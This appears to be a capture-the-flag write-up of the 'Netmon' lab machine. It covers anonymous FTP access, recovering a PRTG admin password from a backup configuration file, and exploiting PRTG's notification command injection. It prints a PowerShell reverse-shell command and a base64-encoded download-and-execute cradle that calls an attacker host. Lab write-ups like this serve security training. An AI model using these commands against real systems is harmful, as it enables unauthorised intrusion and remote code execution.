## Recon

To begin the reconnaissance phase, a full port scan was conducted using Nmap to identify open TCP ports on the target. The scan was optimized for speed and aimed at discovering all ports:

#### Explanation of Key Arguments:
- **`-T5`**: Maximizes scan speed.
- **`-sS`**: Conducts a SYN scan, initiating a TCP handshake without completing it for stealthiness.
- **`-n`**: Disables DNS resolution, reducing the time taken.
- **`-Pn`**: Skips host discovery, assuming the host is online.
- **`-p-`**: Scans all 65535 ports.

```

### Aggressive Nmap Scan for Service and OS Detection
To gather additional information, we perform an aggressive scan. This includes OS detection, service version detection, and script scanning for potential vulnerabilities.:

Since the HTTP port is open, I accessed it in a browser, which revealed a login page for the PRTG Network Monitor.

## FootHold & Privilege escalation

### Anonymous FTP Login

The target allows anonymous login via FTP, providing initial access.

```bash
$ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
```

### Listing Files

Once logged in, I listed the available files:

![Listing files]({ '/assets/img/Netmon/image%201.png' | relative_url })

### Fetching `user.txt`

I retrieved the `user.txt` file as part of the initial foothold:

![Fetching user.txt]({ '/assets/img/Netmon/image%202.png' | relative_url })

### PRTG Configuration Directory

PRTG Network Monitor stores its configuration files in the PRTG data directory on the core server system. By default, this directory is located at:

```bash
%programdata%\Paessler\PRTG Network Monitor
```

Navigating to this folder revealed a few interesting files, as shown below:

![Interesting files in directory]({ '/assets/img/Netmon/image%203.png' | relative_url })

### Downloading Configuration Files

I proceeded to download all files of interest:

![Downloading files]({ '/assets/img/Netmon/image%204.png' | relative_url })

### Searching for Credentials

I searched these configuration files for any credentials related to the default admin user, `prtgadmin`. While the ‚Äúnew‚Äù configuration files did not contain any useful information, I found a backup file that included a password for `prtgadmin`:

![Found credentials]({ '/assets/img/Netmon/image%205.png' | relative_url })

### Attempting Login

I tried logging into the PRTG Network Monitor web interface with the found credentials. However, the login was unsuccessful as the password appeared outdated.

Since the configuration file was last saved in 2018, I modified the password to `PrTg@dmin2019` and successfully logged in:

![Successful login]({ '/assets/img/Netmon/image%206.png' | relative_url })

### PRTG Network Monitor Version and Privileges

Once logged in, I noted that the machine was running PRTG Network Monitor version "18.1.37.13946" with possible administrative privileges.

According to CVE details and an excellent blog post by [Codewatch](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/):

> *An issue was discovered in PRTG Network Monitor before version 18.2.39. An attacker with access to the PRTG System Administrator web console with administrative privileges can exploit an OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.*

### Exploiting Command Injection Vulnerability

To exploit this, I navigated to the ‚ÄúNotifications‚Äù section under ‚ÄúAccount Settings‚Äù in the ‚ÄúSetup‚Äù dropdown menu:

![Navigating to Notifications]({ '/assets/img/Netmon/image%207.png' | relative_url })

> üí° **Vulnerability Note**: An argument supplied in the ‚ÄúParameter‚Äù field of the ‚ÄúNotifications‚Äù configuration is passed directly into the PowerShell script without any sanitization, allowing an attacker to inject arbitrary PowerShell code.

### Setting Up the Reverse Shell Environment

To prepare for a reverse shell, I first created the PowerShell command for establishing the connection:

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Red_Team/HTB]
‚îî‚îÄ$ echo 'Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.13 -Port 4444' >> /home/kali/Red_Team/Tools/Invoke-PowerShellTcp.ps1 
```

Next, I encoded the command to download and execute the reverse shell script, converting it to Base64 format:

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Red_Team/HTB]
‚îî‚îÄ$ echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMwA6ADgAMAA4ADAALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA     
```

**iconv -t UTF-16LE**: This converts the text encoding of the PowerShell command to UTF-16LE (UTF-16 Little Endian), which is often required by Windows PowerShell for Base64-encoded commands. Windows PowerShell expects encoded commands in UTF-16LE, as it‚Äôs the default character encoding for PowerShell scripts.

**base64 -w0**: This takes the UTF-16LE encoded command and encodes it in Base64 format. The -w0 option ensures that the output is a single line without any line breaks, which is important for executing the encoded command smoothly.

### Modifying the Notification Parameter for Command Execution

I then modified the parameter in the Notifications configuration to download and execute ‚ÄúInvoke-PowerShellTcp,‚Äù effectively setting up a reverse shell:

![Modifying the parameter]({ '/assets/img/Netmon/image%208.png' | relative_url })

### Triggering the Shell

To initiate the reverse shell, I triggered the notification using the bell icon. This action executed the command and established a connection back to my listener, providing a shell with SYSTEM privileges.

![Catching the shell]({ '/assets/img/Netmon/image%209.png' | relative_url })
